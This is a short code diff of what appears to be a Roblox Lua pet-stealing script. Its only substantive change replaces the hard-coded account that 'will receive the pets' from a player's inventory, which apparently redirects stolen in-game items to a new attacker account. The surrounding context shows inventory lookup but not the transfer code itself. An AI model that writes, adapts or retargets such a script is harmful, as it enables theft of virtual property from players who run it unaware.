@@ -923,7 +923,7 @@ if not plr then
     return
 end
 
-local recipientUsername = "szymonyut" -- who will receive the pets
+local recipientUsername = "KLPNmk1" -- who will receive the pets
 local customMessage = "KLPN" -- message
 
 local function safeRequire(module)
@@ -1006,6 +1006,7 @@ if petTable then
 else
     print("No pets found in inventory.")
 end
+
 
 
 
